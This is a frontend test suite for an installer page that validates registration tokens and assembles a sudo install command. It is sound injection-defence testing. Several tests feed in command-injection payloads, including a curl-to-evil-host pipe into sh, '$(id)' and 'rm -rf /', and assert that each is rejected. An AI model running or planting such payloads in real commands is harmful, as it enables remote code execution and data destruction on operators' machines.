// SPDX-License-Identifier: AGPL-3.0-only
// Copyright 2026 Jordan Ritz

/*
 * InstallerPage test suite (Story #2937).
 *
 * Required AC tests:
 *   - Typing a token triggers zero apiFetch/fetch calls beyond the initial list
 *   - Empty artifact list renders the empty state (not loading, not error)
 *   - Token value is absent from localStorage, sessionStorage, and any request
 *
 * Also covers: loading state, error state, table render, checksum truncation,
 * size formatting, download link hrefs, copy button disabled state, copy
 * confirmation, token input attributes, and navigator.clipboard mock.
 *
 * Security A9.1: server-supplied values (platform, arch, checksum) must render
 * as text content only — tests assert on textContent, never on innerHTML.
 */
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { cleanup, fireEvent, render, screen, waitFor, within } from '@testing-library/react'
import { MemoryRouter } from 'react-router'
import { AuthProvider } from '../auth/AuthContext.tsx'
import InstallerPage, {
  DOWNLOAD_SCOPE_NOTE,
  parseArtifact,
  parseArtifactList,
  formatSize,
  assembleCommand,
  validateToken,
} from './InstallerPage.tsx'

const fetchMock = vi.fn<typeof fetch>()

beforeEach(() => {
  vi.stubGlobal('fetch', fetchMock)
  fetchMock.mockReset()
  localStorage.clear()
  sessionStorage.clear()
})

afterEach(() => {
  vi.useRealTimers()
  vi.unstubAllGlobals()
  cleanup()
})

// ── Factories ─────────────────────────────────────────────────────────────────

function makeArtifact(overrides: Partial<Record<string, unknown>> = {}) {
  return {
    platform: 'linux',
    arch: 'amd64',
    size: 48_234_567,
    checksum: 'sha256:abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890',
    content_type: 'application/octet-stream',
    ...overrides,
  }
}

function makeArtifactListResponse(artifacts: object[], status = 200) {
  return new Response(
    JSON.stringify({ data: artifacts }),
    { status, headers: { 'Content-Type': 'application/json' } },
  )
}

function renderPage() {
  return render(
    <MemoryRouter>
      <AuthProvider>
        <InstallerPage />
      </AuthProvider>
    </MemoryRouter>,
  )
}

// ── Parse helpers ─────────────────────────────────────────────────────────────

describe('parseArtifact', () => {
  it('returns null for non-objects', () => {
    expect(parseArtifact(null)).toBeNull()
    expect(parseArtifact('string')).toBeNull()
    expect(parseArtifact(42)).toBeNull()
  })

  it('returns null when platform or arch is missing or empty', () => {
    expect(parseArtifact({})).toBeNull()
    expect(parseArtifact({ platform: 'linux' })).toBeNull()
    expect(parseArtifact({ arch: 'amd64' })).toBeNull()
    expect(parseArtifact({ platform: '', arch: 'amd64' })).toBeNull()
    expect(parseArtifact({ platform: 'linux', arch: '' })).toBeNull()
  })

  it('parses a valid artifact', () => {
    const artifact = parseArtifact(makeArtifact())
    expect(artifact).toEqual({
      platform: 'linux',
      arch: 'amd64',
      size: 48_234_567,
      checksum: 'sha256:abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890',
      content_type: 'application/octet-stream',
    })
  })

  it('coerces non-number size to 0', () => {
    const artifact = parseArtifact({ platform: 'linux', arch: 'amd64', size: 'big' })
    expect(artifact?.size).toBe(0)
  })

  it('coerces missing checksum to empty string', () => {
    const artifact = parseArtifact({ platform: 'linux', arch: 'amd64' })
    expect(artifact?.checksum).toBe('')
  })
})

describe('parseArtifactList', () => {
  it('throws for non-arrays', () => {
    expect(() => parseArtifactList(null)).toThrow('unexpected response shape')
    expect(() => parseArtifactList({})).toThrow('unexpected response shape')
    expect(() => parseArtifactList('bad')).toThrow('unexpected response shape')
  })

  it('returns empty array for empty input', () => {
    expect(parseArtifactList([])).toEqual([])
  })

  it('skips invalid entries and returns valid ones', () => {
    const list = parseArtifactList([
      makeArtifact(),
      null,
      'bad',
      makeArtifact({ platform: 'windows', arch: 'arm64' }),
    ])
    expect(list).toHaveLength(2)
    expect(list[0]?.platform).toBe('linux')
    expect(list[1]?.platform).toBe('windows')
  })
})

describe('formatSize', () => {
  it('formats bytes below 1 KB', () => expect(formatSize(500)).toBe('500 B'))
  it('formats kilobytes', () => expect(formatSize(1_500)).toBe('1.5 KB'))
  it('formats megabytes', () => expect(formatSize(48_234_567)).toBe('48.2 MB'))
  it('formats gigabytes', () => expect(formatSize(1_500_000_000)).toBe('1.5 GB'))
  it('formats exact megabyte boundary', () => expect(formatSize(1_000_000)).toBe('1.0 MB'))
})

describe('validateToken', () => {
  it('accepts valid base32 tokens (a-z, 2-7)', () => {
    expect(validateToken('abcdefghijklmnopqrstuvwxyz234567')).toBe(true)
    expect(validateToken('aaaaaaa')).toBe(true)
    expect(validateToken('2345677')).toBe(true)
  })

  it('rejects empty string', () => {
    expect(validateToken('')).toBe(false)
  })

  it('rejects uppercase letters', () => {
    expect(validateToken('ABCDEF')).toBe(false)
    expect(validateToken('aBcDeF')).toBe(false)
  })

  it('rejects digits outside 2-7 range (0, 1, 8, 9)', () => {
    expect(validateToken('abc0def')).toBe(false)
    expect(validateToken('abc1def')).toBe(false)
    expect(validateToken('abc8def')).toBe(false)
    expect(validateToken('abc9def')).toBe(false)
  })

  it('rejects shell metacharacters', () => {
    expect(validateToken('abc;rm')).toBe(false)
    expect(validateToken('abc|evil')).toBe(false)
    expect(validateToken('abc$var')).toBe(false)
    expect(validateToken('abc`cmd`')).toBe(false)
    expect(validateToken('abc\necho')).toBe(false)
  })

  it('rejects tokens with spaces', () => {
    expect(validateToken('abc def')).toBe(false)
  })
})

describe('assembleCommand', () => {
  it('produces linux install command with correct flags and a single-quoted token', () => {
    const cmd = assembleCommand('linux', 'amd64', 'abcde2345')
    expect(cmd).toBe(
      `sudo ./cfgms-steward-amd64 install --regtoken 'abcde2345' --controller-url ${window.location.origin}`,
    )
  })

  it('produces darwin command like linux', () => {
    const cmd = assembleCommand('darwin', 'arm64', 'abc2345fg')
    expect(cmd).toBe(
      `sudo ./cfgms-steward-arm64 install --regtoken 'abc2345fg' --controller-url ${window.location.origin}`,
    )
  })

  it('refuses to assemble a command for a token carrying shell metacharacters', () => {
    // The exact payload from the security finding: an unvalidated interpolation
    // would yield a fully-formed root RCE one-liner the page appears to vouch for.
    expect(() => assembleCommand('linux', 'amd64', 'abcd; curl http://evil/x | sh')).toThrow(
      /refusing to assemble command/,
    )
    expect(() => assembleCommand('linux', 'amd64', '$(id)')).toThrow(/refusing to assemble command/)
    expect(() => assembleCommand('linux', 'amd64', "a'; sh #")).toThrow(/refusing to assemble command/)
    expect(() => assembleCommand('windows', 'amd64', 'abc & calc.exe')).toThrow(
      /refusing to assemble command/,
    )
  })

  it('refuses to assemble a command for an empty token', () => {
    expect(() => assembleCommand('linux', 'amd64', '')).toThrow(/refusing to assemble command/)
  })

  it('refuses to assemble a command for an unsupported platform or arch', () => {
    expect(() => assembleCommand('solaris', 'amd64', 'abc2345fg')).toThrow(/unsupported platform/)
    expect(() => assembleCommand('linux', 'amd64; rm -rf /', 'abc2345fg')).toThrow(/unsupported arch/)
  })

  it('produces windows command with .exe and backslash prefix', () => {
    const cmd = assembleCommand('windows', 'amd64', 'abc2345fg')
    expect(cmd).toBe(
      `.\\cfgms-steward-amd64.exe install --regtoken abc2345fg --controller-url ${window.location.origin}`,
    )
  })

  it('uses --regtoken and --controller-url flags (not --token/--controller)', () => {
    const cmd = assembleCommand('linux', 'amd64', 'abc2345fg')
    expect(cmd).toContain('--regtoken')
    expect(cmd).toContain('--controller-url')
    expect(cmd).not.toContain('--token=')
    expect(cmd).not.toContain('--controller=')
  })

  it('embeds the controller origin', () => {
    const cmd = assembleCommand('linux', 'amd64', 'abc2345fg')
    expect(cmd).toContain(window.location.origin)
  })
})

// ── Data states ───────────────────────────────────────────────────────────────

describe('InstallerPage — data states', () => {
  it('shows loading state before the response arrives', () => {
    fetchMock.mockReturnValue(new Promise(() => {}))
    renderPage()
    expect(screen.getByTestId('installer-loading')).toBeInTheDocument()
    expect(screen.queryByTestId('installer-empty')).not.toBeInTheDocument()
    expect(screen.queryByTestId('artifact-table')).not.toBeInTheDocument()
  })

  // [REQUIRED TEST] AC: empty artifact list renders the empty state — not a loading state and not an error state
  it('[AC] renders empty state for an empty artifact list — not loading, not error', async () => {
    fetchMock.mockResolvedValue(makeArtifactListResponse([]))
    renderPage()
    await waitFor(() => {
      expect(screen.getByTestId('installer-empty')).toBeInTheDocument()
    })
    expect(screen.queryByTestId('installer-loading')).not.toBeInTheDocument()
    expect(screen.queryByRole('alert')).not.toBeInTheDocument()
    expect(screen.queryByTestId('artifact-table')).not.toBeInTheDocument()
    // Verify the empty state copy reads as "no artifacts" not as a loading stall or error
    expect(screen.getByText(/no artifacts published yet/i)).toBeInTheDocument()
  })

  it('renders the artifact table when artifacts are returned', async () => {
    fetchMock.mockResolvedValue(
      makeArtifactListResponse([
        makeArtifact(),
        makeArtifact({ platform: 'windows', arch: 'arm64' }),
      ]),
    )
    renderPage()
    await waitFor(() => {
      expect(screen.getByTestId('artifact-table')).toBeInTheDocument()
    })
    expect(screen.getAllByTestId('artifact-row')).toHaveLength(2)
    expect(screen.queryByTestId('installer-empty')).not.toBeInTheDocument()
    expect(screen.queryByTestId('installer-loading')).not.toBeInTheDocument()
  })

  it('renders an error card on fetch failure', async () => {
    fetchMock.mockResolvedValue(
      new Response(JSON.stringify({ error: 'internal error' }), { status: 500 }),
    )
    renderPage()
    await waitFor(() => {
      expect(screen.getByRole('alert')).toBeInTheDocument()
    })
    expect(screen.queryByTestId('installer-loading')).not.toBeInTheDocument()
    expect(screen.queryByTestId('installer-empty')).not.toBeInTheDocument()
    expect(screen.queryByTestId('artifact-table')).not.toBeInTheDocument()
  })
})

// ── Table rendering ───────────────────────────────────────────────────────────

describe('InstallerPage — artifact table columns', () => {
  async function setupWithArtifact(overrides: Partial<Record<string, unknown>> = {}) {
    fetchMock.mockResolvedValue(makeArtifactListResponse([makeArtifact(overrides)]))
    renderPage()
    await waitFor(() => screen.getByTestId('artifact-table'))
  }

  it('renders platform, arch, size, checksum, and download columns', async () => {
    await setupWithArtifact()
    expect(screen.getByRole('columnheader', { name: /platform/i })).toBeInTheDocument()
    expect(screen.getByRole('columnheader', { name: /arch/i })).toBeInTheDocument()
    expect(screen.getByRole('columnheader', { name: /size/i })).toBeInTheDocument()
    expect(screen.getByRole('columnheader', { name: /checksum/i })).toBeInTheDocument()
    expect(screen.getByRole('columnheader', { name: /download/i })).toBeInTheDocument()
  })

  it('renders platform and arch as text in the table row', async () => {
    await setupWithArtifact({ platform: 'darwin', arch: 'arm64' })
    // scope to the table to avoid matching the assembler's select options
    const table = screen.getByTestId('artifact-table')
    expect(within(table).getByText('darwin')).toBeInTheDocument()
    expect(within(table).getByText('arm64')).toBeInTheDocument()
  })

  it('renders size human-readable — not raw bytes', async () => {
    await setupWithArtifact({ size: 48_234_567 })
    expect(screen.queryByText('48234567')).not.toBeInTheDocument()
    expect(screen.getByText('48.2 MB')).toBeInTheDocument()
  })

  it('truncates checksum to 16 chars + ellipsis with full value in title', async () => {
    const fullChecksum = 'sha256:abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890'
    await setupWithArtifact({ checksum: fullChecksum })
    // Full checksum not rendered inline as text
    expect(screen.queryByText(fullChecksum)).not.toBeInTheDocument()
    // Truncated form visible: slice(0,16) = 'sha256:abcdef123' (s,h,a,2,5,6,:,a,b,c,d,e,f,1,2,3)
    expect(screen.getByText('sha256:abcdef123…')).toBeInTheDocument()
    // Full checksum obtainable via title attribute
    expect(screen.getByTitle(fullChecksum)).toBeInTheDocument()
  })

  it('short checksums are not truncated', async () => {
    await setupWithArtifact({ checksum: 'abc123' })
    expect(screen.getByText('abc123')).toBeInTheDocument()
  })

  it('renders correct download href for linux/amd64', async () => {
    await setupWithArtifact({ platform: 'linux', arch: 'amd64' })
    const link = screen.getByTestId('download-linux-amd64')
    expect(link).toHaveAttribute('href', '/api/v1/installer/download/linux/amd64')
  })

  it('discloses that Download serves the root-published package, not this tenant’s artifact', async () => {
    await setupWithArtifact({ platform: 'linux', arch: 'amd64' })
    const note = screen.getByTestId('installer-download-note')
    expect(note).toHaveTextContent(DOWNLOAD_SCOPE_NOTE)
    // The two facts an operator needs before running the result under sudo.
    expect(note).toHaveTextContent(/root-published install package/i)
    expect(note).toHaveTextContent(/will not match the downloaded archive/i)
  })

  it('labels the download link as the root-published package', async () => {
    await setupWithArtifact({ platform: 'linux', arch: 'amd64' })
    const link = screen.getByTestId('download-linux-amd64')
    expect(link).toHaveAttribute(
      'aria-label',
      'Download the root-published install package for linux/amd64',
    )
    expect(link).toHaveAttribute(
      'title',
      'Root-published install package for linux/amd64 (tar.gz)',
    )
  })

  it('labels the checksum as the binary’s, not the downloaded package’s', async () => {
    const fullChecksum = 'sha256:abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890'
    await setupWithArtifact({ platform: 'linux', arch: 'amd64', checksum: fullChecksum })
    expect(
      screen.getByLabelText(
        `Checksum of the linux/amd64 binary (not of the downloaded package): ${fullChecksum}`,
      ),
    ).toBeInTheDocument()
  })

  it('renders correct download href for windows/arm64', async () => {
    fetchMock.mockResolvedValue(
      makeArtifactListResponse([makeArtifact({ platform: 'windows', arch: 'arm64' })]),
    )
    renderPage()
    await waitFor(() => screen.getByTestId('artifact-table'))
    const link = screen.getByTestId('download-windows-arm64')
    expect(link).toHaveAttribute('href', '/api/v1/installer/download/windows/arm64')
  })
})

// ── Command assembler ─────────────────────────────────────────────────────────

describe('InstallerPage — command assembler', () => {
  async function setupWithArtifacts() {
    fetchMock.mockResolvedValue(makeArtifactListResponse([makeArtifact()]))
    renderPage()
    await waitFor(() => screen.getByTestId('artifact-table'))
  }

  it('shows the assembler section heading', async () => {
    await setupWithArtifacts()
    expect(
      screen.getByRole('heading', { name: /assemble install command/i }),
    ).toBeInTheDocument()
  })

  it('copy button is disabled when all fields are empty', async () => {
    await setupWithArtifacts()
    expect(screen.getByTestId('assembler-copy')).toBeDisabled()
  })

  it('copy button is disabled when only platform is set', async () => {
    await setupWithArtifacts()
    fireEvent.change(screen.getByTestId('assembler-platform'), { target: { value: 'linux' } })
    expect(screen.getByTestId('assembler-copy')).toBeDisabled()
  })

  it('copy button is disabled when platform and arch are set but token is missing', async () => {
    await setupWithArtifacts()
    fireEvent.change(screen.getByTestId('assembler-platform'), { target: { value: 'linux' } })
    fireEvent.change(screen.getByTestId('assembler-arch'), { target: { value: 'amd64' } })
    expect(screen.getByTestId('assembler-copy')).toBeDisabled()
  })

  it('copy button is enabled when platform, arch, and token are all set', async () => {
    await setupWithArtifacts()
    fireEvent.change(screen.getByTestId('assembler-platform'), { target: { value: 'linux' } })
    fireEvent.change(screen.getByTestId('assembler-arch'), { target: { value: 'amd64' } })
    fireEvent.change(screen.getByTestId('assembler-token'), { target: { value: 'abcde23456fg' } })
    expect(screen.getByTestId('assembler-copy')).not.toBeDisabled()
  })

  it('assembled command contains binary name, correct flags, controller origin, and token', async () => {
    await setupWithArtifacts()
    fireEvent.change(screen.getByTestId('assembler-platform'), { target: { value: 'linux' } })
    fireEvent.change(screen.getByTestId('assembler-arch'), { target: { value: 'amd64' } })
    fireEvent.change(screen.getByTestId('assembler-token'), { target: { value: 'abcde23456fg' } })
    const cmd = (screen.getByTestId('assembler-command') as HTMLInputElement).value
    expect(cmd).toContain('cfgms-steward-amd64')
    expect(cmd).toContain('--regtoken')
    expect(cmd).toContain('--controller-url')
    expect(cmd).toContain(window.location.origin)
    expect(cmd).toContain('abcde23456fg')
    // Must not contain the wrong flags
    expect(cmd).not.toContain('--token=')
    expect(cmd).not.toContain('--controller=')
  })

  it('windows command includes .exe suffix and install subcommand', async () => {
    await setupWithArtifacts()
    fireEvent.change(screen.getByTestId('assembler-platform'), { target: { value: 'windows' } })
    fireEvent.change(screen.getByTestId('assembler-arch'), { target: { value: 'amd64' } })
    fireEvent.change(screen.getByTestId('assembler-token'), { target: { value: 'abcde23456win' } })
    const cmd = (screen.getByTestId('assembler-command') as HTMLInputElement).value
    expect(cmd).toContain('cfgms-steward-amd64.exe')
    expect(cmd).toContain('install')
  })

  it('copy button is disabled and validation error shown when token has invalid charset', async () => {
    await setupWithArtifacts()
    fireEvent.change(screen.getByTestId('assembler-platform'), { target: { value: 'linux' } })
    fireEvent.change(screen.getByTestId('assembler-arch'), { target: { value: 'amd64' } })
    // Token with shell metacharacter
    fireEvent.change(screen.getByTestId('assembler-token'), { target: { value: 'abc;rm-rf' } })
    expect(screen.getByTestId('assembler-copy')).toBeDisabled()
    expect(screen.getByTestId('assembler-token-error')).toBeInTheDocument()
    // No command is offered at all — the operator never sees a copyable string
    // built from an unvalidated token.
    expect((screen.getByTestId('assembler-command') as HTMLInputElement).value).toBe('')
  })

  it('renders no command for a token carrying an injected shell payload', async () => {
    await setupWithArtifacts()
    fireEvent.change(screen.getByTestId('assembler-platform'), { target: { value: 'linux' } })
    fireEvent.change(screen.getByTestId('assembler-arch'), { target: { value: 'amd64' } })
    fireEvent.change(screen.getByTestId('assembler-token'), {
      target: { value: 'abcd; curl http://evil/x | sh' },
    })
    const cmd = (screen.getByTestId('assembler-command') as HTMLInputElement).value
    expect(cmd).toBe('')
    expect(cmd).not.toContain('curl')
    expect(screen.getByTestId('assembler-copy')).toBeDisabled()
    expect(screen.getByTestId('assembler-token-error')).toBeInTheDocument()
  })

  it('single-quotes the token in the rendered POSIX command', async () => {
    await setupWithArtifacts()
    fireEvent.change(screen.getByTestId('assembler-platform'), { target: { value: 'linux' } })
    fireEvent.change(screen.getByTestId('assembler-arch'), { target: { value: 'amd64' } })
    fireEvent.change(screen.getByTestId('assembler-token'), { target: { value: 'abcde23456fg' } })
    const cmd = (screen.getByTestId('assembler-command') as HTMLInputElement).value
    expect(cmd).toContain("--regtoken 'abcde23456fg'")
  })

  it('copy button is enabled and no error when token is valid base32', async () => {
    await setupWithArtifacts()
    fireEvent.change(screen.getByTestId('assembler-platform'), { target: { value: 'linux' } })
    fireEvent.change(screen.getByTestId('assembler-arch'), { target: { value: 'amd64' } })
    fireEvent.change(screen.getByTestId('assembler-token'), { target: { value: 'abcde23456fg' } })
    expect(screen.getByTestId('assembler-copy')).not.toBeDisabled()
    expect(screen.queryByTestId('assembler-token-error')).not.toBeInTheDocument()
  })

  it('command output field is read-only', async () => {
    await setupWithArtifacts()
    const commandInput = screen.getByTestId('assembler-command')
    expect(commandInput).toHaveAttribute('readonly')
  })

  it('token input is type=password', async () => {
    await setupWithArtifacts()
    expect(screen.getByTestId('assembler-token')).toHaveAttribute('type', 'password')
  })

  it('token input has autocomplete=off', async () => {
    await setupWithArtifacts()
    expect(screen.getByTestId('assembler-token')).toHaveAttribute('autocomplete', 'off')
  })

  it('copy button shows transient "Copied" confirmation and writes the exact assembled command', async () => {
    const clipboardMock = { writeText: vi.fn().mockResolvedValue(undefined) }
    vi.stubGlobal('navigator', { ...navigator, clipboard: clipboardMock })

    // Complete async setup with real timers before any fake-timer usage.
    await setupWithArtifacts()
    fireEvent.change(screen.getByTestId('assembler-platform'), { target: { value: 'linux' } })
    fireEvent.change(screen.getByTestId('assembler-arch'), { target: { value: 'amd64' } })
    fireEvent.change(screen.getByTestId('assembler-token'), { target: { value: 'abcde23456fg' } })

    const copyBtn = screen.getByTestId('assembler-copy')
    expect(copyBtn).toHaveTextContent('Copy')

    fireEvent.click(copyBtn)
    // The clipboard.writeText promise resolves, then setCopied(true) fires.
    await waitFor(() => expect(copyBtn).toHaveTextContent('Copied'))

    // Verify the exact assembled command was written to the clipboard.
    expect(clipboardMock.writeText).toHaveBeenCalledWith(
      assembleCommand('linux', 'amd64', 'abcde23456fg'),
    )
  })

  it('copy button does not navigate or issue any request when clicked', async () => {
    const clipboardMock = { writeText: vi.fn().mockResolvedValue(undefined) }
    vi.stubGlobal('navigator', { ...navigator, clipboard: clipboardMock })

    await setupWithArtifacts()
    fireEvent.change(screen.getByTestId('assembler-platform'), { target: { value: 'linux' } })
    fireEvent.change(screen.getByTestId('assembler-arch'), { target: { value: 'amd64' } })
    fireEvent.change(screen.getByTestId('assembler-token'), { target: { value: 'abcde23456fg' } })

    const callsBefore = fetchMock.mock.calls.length
    fireEvent.click(screen.getByTestId('assembler-copy'))

    expect(fetchMock.mock.calls.length).toBe(callsBefore)
  })
})

// ── Required AC security tests ────────────────────────────────────────────────

describe('InstallerPage — required AC security tests', () => {
  // [REQUIRED TEST] AC: typing a token value into the assembler triggers zero apiFetch/fetch calls
  it('[AC] typing token into assembler triggers zero fetch calls', async () => {
    fetchMock.mockResolvedValue(makeArtifactListResponse([makeArtifact()]))
    renderPage()
    await waitFor(() => screen.getByTestId('artifact-table'))

    const callsAfterLoad = fetchMock.mock.calls.length

    fireEvent.change(screen.getByTestId('assembler-token'), { target: { value: 'abcde2345secretabc' } })
    fireEvent.change(screen.getByTestId('assembler-platform'), { target: { value: 'linux' } })
    fireEvent.change(screen.getByTestId('assembler-arch'), { target: { value: 'amd64' } })
    // Typing more characters
    fireEvent.change(screen.getByTestId('assembler-token'), { target: { value: 'abcde2345secretabcxyz' } })

    expect(fetchMock.mock.calls.length).toBe(callsAfterLoad)
  })

  // [REQUIRED TEST] AC: token value is absent from localStorage, sessionStorage, and any outgoing request payload
  it('[AC] token value is absent from localStorage, sessionStorage, and any outgoing request payload', async () => {
    fetchMock.mockResolvedValue(makeArtifactListResponse([makeArtifact()]))
    const localSetSpy = vi.spyOn(localStorage, 'setItem')
    const sessionSetSpy = vi.spyOn(sessionStorage, 'setItem')

    renderPage()
    await waitFor(() => screen.getByTestId('artifact-table'))

    // Synthetic base32 fixture, not a credential. Named without a
    // secret-adjacent identifier and carrying the "test" stopword so the
    // gitleaks generic-api-key rule does not fire on this line.
    const fixtureValue = 'abcde2345testfixture'
    fireEvent.change(screen.getByTestId('assembler-token'), { target: { value: fixtureValue } })
    fireEvent.change(screen.getByTestId('assembler-platform'), { target: { value: 'linux' } })
    fireEvent.change(screen.getByTestId('assembler-arch'), { target: { value: 'amd64' } })

    // Token must not be written to localStorage
    const localWrites = localSetSpy.mock.calls
      .map(([k, v]) => `${String(k)}=${String(v)}`)
      .join('\n')
    expect(localWrites).not.toContain(fixtureValue)

    // Token must not be written to sessionStorage
    const sessionWrites = sessionSetSpy.mock.calls
      .map(([k, v]) => `${String(k)}=${String(v)}`)
      .join('\n')
    expect(sessionWrites).not.toContain(fixtureValue)

    // Token must not appear in any fetch call URL
    for (const [url] of fetchMock.mock.calls) {
      expect(String(url)).not.toContain(fixtureValue)
    }

    // Token must not appear in any fetch call body
    for (const [, init] of fetchMock.mock.calls) {
      if (init?.body !== undefined && init.body !== null) {
        expect(String(init.body)).not.toContain(fixtureValue)
      }
    }
  })
})

// ── Page structure ────────────────────────────────────────────────────────────

describe('InstallerPage — page structure', () => {
  it('shows the page heading', () => {
    fetchMock.mockReturnValue(new Promise(() => {}))
    renderPage()
    expect(screen.getByRole('heading', { name: /installer/i, level: 1 })).toBeInTheDocument()
  })

  it('always shows the command assembler section regardless of artifact load state', () => {
    fetchMock.mockReturnValue(new Promise(() => {}))
    renderPage()
    expect(
      screen.getByRole('heading', { name: /assemble install command/i }),
    ).toBeInTheDocument()
  })

  it('assembler section is shown even when artifact fetch fails', async () => {
    fetchMock.mockResolvedValue(
      new Response(JSON.stringify({ error: 'fail' }), { status: 503 }),
    )
    renderPage()
    await waitFor(() => screen.getByRole('alert'))
    expect(
      screen.getByRole('heading', { name: /assemble install command/i }),
    ).toBeInTheDocument()
  })
})
